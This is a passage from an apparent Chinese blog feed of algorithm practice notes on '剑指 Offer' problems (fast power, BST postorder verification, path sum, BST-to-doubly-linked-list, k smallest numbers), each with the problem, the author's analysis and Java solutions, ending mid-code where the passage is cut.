    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2016.%20%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现 pow(x, n) ，即计算 x 的 n 次幂函数（即，xn）。不得使用库函数，同时不需要考虑大数问题。<br><img src="/upload/2022/03/image-27e1cccecfc046b8a1d3e289c93ab0f7.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到题目需要计算幂函数，首先想到的是一个for循环解决，但是运行超时了，后面发现有快速幂这种解法，其思路和二分法相似，并且方法用到了位运算，效率更高，这种方式之前写程序都没有接触过。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><strong>转化为位运算：</strong><br>向下整除 n &#x2F;&#x2F; 2 等价于 右移一位 n &gt;&gt; 1 ；<br>取余数 n%2 等价于判断二进制最右一位值 n&amp;1 </p><p><strong>算法流程：</strong><br>当 x&#x3D;0 时：直接返回 0 （避免后续 x &#x3D; 1 &#x2F; x 操作报错）。<br>初始化 res&#x3D;1 ；<br>当 n&lt;0 时：把问题转化至n≥0 的范围内，即执行 x &#x3D; 1&#x2F;x ，n &#x3D; - n ；<br>循环计算：当 n&#x3D;0 时跳出；<br>当 n&amp;1&#x3D;1 时：将当前 x 乘入 res （即 res *&#x3D; x ）；<br>执行 x &#x3D; x^2 （即 x *&#x3D; x ）；<br>执行 n 右移一位（即 n &gt;&gt;&#x3D; 1）。<br>返回 res 。<br><strong>复杂度分析：</strong><br>时间复杂度 O(log2 n) ：二分的时间复杂度为对数级别。<br>空间复杂度 O(1) ： res, b 等变量占用常数大小额外空间。</p><p>Java 代码中 int32 变量 n∈[−2147483648,2147483647] ，因此当 n&#x3D;−2147483648 时执行 n &#x3D; -n 会因越界而赋值出错。解决方法是先将 n 存入 long 变量 b ，后面用 b 操作即可。</p><p><strong>代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">b</span> <span class="operator">=</span> n;</span><br><span class="line">        <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">if</span>(b &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            x = <span class="number">1</span> / x;</span><br><span class="line">            b = -b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(b &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>((b &amp; <span class="number">1</span>) == <span class="number">1</span>) res *= x;</span><br><span class="line">            x *= x;</span><br><span class="line">            b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>位运算</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 33. 二叉搜索树的后序遍历序列</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2033.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2033.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历结果。如果是则返回 true，否则返回 false。假设输入的数组的任意两个数字都互不相同。<br> <img src="/upload/2022/03/image-5f14ca4d4da444e5aa6458e1b5810761.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到题没思路，不知道从何下手，看题解能看懂，运用二叉搜索树的性质和后续遍历的性质。题解中使用的为分治的思维：<br>根据二叉搜索树的定义，可以通过递归，判断所有子树的 正确性 （即其后序遍历是否满足二叉搜索树的定义） ，若所有子树都正确，则此序列为二叉搜索树的后序遍历。<br><strong>递归解析：</strong><br>终止条件： 当 i≥j ，说明此子树节点数量 ≤1 ，无需判别正确性，因此直接返回 true ；<br>递推工作：<br>1.划分左右子树： 遍历后序遍历的 [i, j] 区间元素，寻找 第一个大于根节点 的节点，索引记为 m 。此时，可划分出左子树区间 [i,m−1] 、右子树区间[m,j−1] 、根节点索引 j 。<br><img src="/upload/2022/03/image-053da2310b7446afb665d99cc1b5bd2f.png" alt="image.png"><br>2.判断是否为二叉搜索树：<br>左子树区间 [i,m−1] 内的所有节点都应 &lt; postorder[j] 。而第 1.划分左右子树 步骤已经保证左子树区间的正确性，因此只需要判断右子树区间即可。<br>右子树区间 [m,j−1] 内的所有节点都应 &gt;postorder[j] 。实现方式为遍历，当遇到 ≤postorder[j] 的节点则跳出；则可通过 p&#x3D;j 判断是否为二叉搜索树。<br>返回值： 所有子树都需正确才可判定正确，因此使用 与逻辑符&amp;&amp; 连接。<br>1 p&#x3D;j：判断 此树 是否正确。<br>2 recur(i, m - 1) ： 判断 此树的左子树 是否正确。<br>3 recur(m, j - 1) ： 判断 此树的右子树 是否正确。</p><p>复杂度分析：<br>时间复杂度 O(N^2) ： 每次调用recur(i,j) 减去一个根节点，因此递归占用 O(N)；最差情况下（即当树退化为链表），每轮递归都需遍历树所有节点，占用 O(N) 。<br>空间复杂度 O(N) ： 最差情况下（即当树退化为链表），递归深度将达到 N 。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verifyPostorder</span><span class="params">(<span class="type">int</span>[] postorder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> recur(postorder, <span class="number">0</span>, postorder.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">recur</span><span class="params">(<span class="type">int</span>[] postorder, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= j) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> i;</span><br><span class="line">        <span class="keyword">while</span>(postorder[p] &lt; postorder[j]) p++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> p;</span><br><span class="line">        <span class="keyword">while</span>(postorder[p] &gt; postorder[j]) p++;</span><br><span class="line">        <span class="keyword">return</span> p == j &amp;&amp; recur(postorder, i, m - <span class="number">1</span>) &amp;&amp; recur(postorder, m, j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种题解为使用辅助单调栈，使后序遍历倒过来成为先序遍历的镜像再进行比较，这种思路比较难想，不过效率会高些。</p>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二叉搜索树</tag>
      
      <tag>分治</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 34. 二叉树中和为某一值的路径</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2034.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2034.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你二叉树的根节点 root 和一个整数目标和 targetSum ，找出所有 从根节点到叶子节点 路径总和等于给定目标和的路径。</p><p>叶子节点 是指没有子节点的节点。<br><img src="/upload/2022/03/image-c9a27253cc1142b39b92b1ab94f35c10.png" alt="image.png"></p><p><img src="/upload/2022/03/image-46e2d00d8c51495f80b7efd1d2ebede4.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我看到这题能够感觉到思路是深度优先，即使用先序遍历，但是要编码的时候感觉很困难，忘了如何去判断结束条件，也就是不知道如何记录路径。主要问题还是对树的遍历熟悉度不够，还需要多看多练，这题的解答直接搬运的题解。</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p><strong>解题思路：</strong><br>本问题是典型的二叉树方案搜索问题，使用回溯法解决，其包含 先序遍历 + 路径记录 两部分。</p><p>先序遍历： 按照 “根、左、右” 的顺序，遍历树的所有节点。<br>路径记录： 在先序遍历中，记录从根节点到当前节点的路径。当路径为根节点到叶节点形成的路径 且各节点值的和等于目标值 sum 时，将此路径加入结果列表。</p><p><strong>算法流程：</strong><br>pathSum(root, sum) 函数：<br>初始化： 结果列表 res ，路径列表 path 。<br>返回值： 返回 res 即可。</p><p>recur(root, tar) 函数：<br>递推参数： 当前节点 root ，当前目标值 tar 。<br>终止条件： 若节点 root 为空，则直接返回。</p><p><strong>递推工作：</strong><br>路径更新： 将当前节点值 root.val 加入路径 path ；<br>目标值更新： tar &#x3D; tar - root.val（即目标值 tar 从 sum 减至 00 ）；<br>路径记录： 当root 为叶节点 且路径和等于目标值 ，则将此路径 path 加入 res 。<br>先序遍历： 递归左 &#x2F; 右子节点。<br>路径恢复： 向上回溯前，需要将当前节点从路径 path 中删除，即执行 path.pop() 。</p><p><strong>复杂度分析：</strong><br>时间复杂度 O(N) ： N 为二叉树的节点数，先序遍历需要遍历所有节点。<br>空间复杂度 O(N) ： 最差情况下，即树退化为链表时，path 存储所有树节点，使用 O(N) 额外空间。</p><p><strong>代码：</strong><br>值得注意的是，记录路径时若直接执行 res.append(path) ，则是将 path 对象加入了 res ；后续 path 改变时， res 中的 path 对象也会随之改变。<br>正确做法：res.append(list(path)) ，相当于复制了一个 path 并加入到 res 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    LinkedList&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(); </span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">pathSum</span><span class="params">(TreeNode root, <span class="type">int</span> sum)</span> &#123;</span><br><span class="line">        recur(root, sum);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">recur</span><span class="params">(TreeNode root, <span class="type">int</span> tar)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        path.add(root.val);</span><br><span class="line">        tar -= root.val;</span><br><span class="line">        <span class="keyword">if</span>(tar == <span class="number">0</span> &amp;&amp; root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>(path));</span><br><span class="line">        recur(root.left, tar);</span><br><span class="line">        recur(root.right, tar);</span><br><span class="line">        path.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>递归</tag>
      
      <tag>二叉树</tag>
      
      <tag>回溯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 36. 二叉搜索树与双向链表</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2036.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2036.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。</p><p>为了让您更好地理解问题，以下面的二叉搜索树为例：<br><img src="/upload/2022/03/image-86c1806948ac40a9826acc9a1871d1e1.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>第一反应为中序遍历，但是不知道如何将遍历得到的节点使用双向链表连接，印象里只会使用单链表，后面想可以使用一个LinkedList来存储数据再实现，但这样不如就在遍历的时候完成链表的连接。自己在连接双链表使不知道如何根据树来连接节点所以不会。</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>根据分析思路找到了两种解答，其实方式都是一样的，都是中序遍历，其中的不同点就在于如何将节点使用链表连接起来</p><p>使用链表存储节点后再进行连接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">treeToDoublyList</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        LinkedList&lt;Node&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">head</span> <span class="operator">=</span> <span class="literal">null</span>,tail = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>||!stack.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur=cur.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cur = stack.pop();</span><br><span class="line">                <span class="keyword">if</span>(head==<span class="literal">null</span>)&#123;</span><br><span class="line">                    head = cur;</span><br><span class="line">                    tail = cur;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    tail.right = cur;</span><br><span class="line">                    cur.left = tail;</span><br><span class="line">                    tail = cur;</span><br><span class="line">                &#125;</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tail.right = head;</span><br><span class="line">        head.left = tail;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>官方解答：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 中序，递归，来自解题大佬</span></span><br><span class="line">    Node pre, head;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">treeToDoublyList</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        <span class="comment">// 边界值</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        dfs(root);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 题目要求头尾连接</span></span><br><span class="line">        head.left = pre;</span><br><span class="line">        pre.right = head;</span><br><span class="line">        <span class="comment">// 返回头节点</span></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(Node cur)</span> &#123;</span><br><span class="line">        <span class="comment">// 递归结束条件</span></span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        dfs(cur.left);</span><br><span class="line">        <span class="comment">// 如果pre为空，就说明是第一个节点，头结点，然后用head保存头结点，用于之后的返回</span></span><br><span class="line">        <span class="keyword">if</span> (pre == <span class="literal">null</span>) head = cur;</span><br><span class="line">        <span class="comment">// 如果不为空，那就说明是中间的节点。并且pre保存的是上一个节点，</span></span><br><span class="line">        <span class="comment">// 让上一个节点的右指针指向当前节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pre != <span class="literal">null</span>) pre.right = cur;</span><br><span class="line">        <span class="comment">// 再让当前节点的左指针指向父节点，也就连成了双向链表</span></span><br><span class="line">        cur.left = pre;</span><br><span class="line">        <span class="comment">// 保存当前节点，用于下层递归创建</span></span><br><span class="line">        pre = cur;</span><br><span class="line">        dfs(cur.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二叉搜索树</tag>
      
      <tag>递归</tag>
      
      <tag>双向链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 40. 最小的k个数</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2040.%20%E6%9C%80%E5%B0%8F%E7%9A%84k%E4%B8%AA%E6%95%B0/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2040.%20%E6%9C%80%E5%B0%8F%E7%9A%84k%E4%B8%AA%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入整数数组 arr ，找出其中最小的 k 个数。例如，输入4、5、1、6、2、7、3、8这8个数字，则最小的4个数字是1、2、3、4。<br><img src="/upload/2022/03/image-b0eaadbc5ffb4e509b9c01bb535dc421.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>求数组中最大最小值问题方法有几种，一般是写一个排序算法再选取排序后的数，其中排序算法肯定不能用Arrays.sort方法，最好还是手写排序算法，一般手写算法最优使用快速排序。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这题最开始我直接用的sort方法，后面看了题解后才用了快排的思路写出来，其中快速排序根据思路是有一个框架的，需要掌握，这次除了快排还可以使用改进后的快速排序，效率更高。</p><p><strong>快速排序：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getLeastNumbers(<span class="type">int</span>[] arr, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;= arr.length) <span class="keyword">return</span> arr;</span><br><span class="line">        quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> Arrays.copyOf(arr, k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> l,j = r;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; arr[j] &gt;= arr[l]) j--;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; arr[i] &lt;= arr[l]) i++;</span><br><span class="line">            swap(arr,i,j);</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr,i,l);</span><br><span class="line">        quickSort(arr,l,i-<span class="number">1</span>);</span><br><span class="line">        quickSort(arr,i+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> l, <span class="type">int</span> r)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[l];</span><br><span class="line">        arr[l] = arr[r];</span><br><span class="line">        arr[r] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>改进后的快速排序</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getLeastNumbers(<span class="type">int</span>[] arr, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;= arr.length) <span class="keyword">return</span> arr;</span><br><span class="line">        quickSort(arr, k, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> Arrays.copyOf(arr, k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> k, <span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> l,j = r;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; arr[j] &gt;= arr[l]) j--;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; arr[i] &lt;= arr[l]) i++;</span><br><span class="line">            swap(arr,i,j);</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr,i,l);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; k)  quickSort(arr,k,i+<span class="number">1</span>,r);</span><br><span class="line">        <span class="keyword">if</span> (i &gt; k)  quickSort(arr,k,l,i-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> l, <span class="type">int</span> r)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[l];</span><br><span class="line">        arr[l] = arr[r];</span><br><span class="line">        arr[r] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我看了其他人的题解，其中有不少人提到使用<strong>最大堆</strong>进行求解，我个人觉得堆就是一个内置排序的队列，测试了一下效率非常低，不知道为什么还是有很多人推荐使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保持堆的大小为K，然后遍历数组中的数字，遍历的时候做如下判断：</span></span><br><span class="line"><span class="comment">// 1. 若目前堆的大小小于K，将当前数字放入堆中。</span></span><br><span class="line"><span class="comment">// 2. 否则判断当前数字与大根堆堆顶元素的大小关系，如果当前数字比大根堆堆顶还大，这个数就直接跳过；</span></span><br><span class="line"><span class="comment">//    反之如果当前数字比大根堆堆顶小，先poll掉堆顶，再将该数字放入堆中。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getLeastNumbers(<span class="type">int</span>[] arr, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">0</span> || arr.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 默认是小根堆，实现大根堆需要重写一下比较器。</span></span><br><span class="line">        Queue&lt;Integer&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((v1, v2) -&gt; v2 - v1);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num: arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pq.size() &lt; k) &#123;</span><br><span class="line">                pq.offer(num);</span><br><span class="line">            &#125; <span 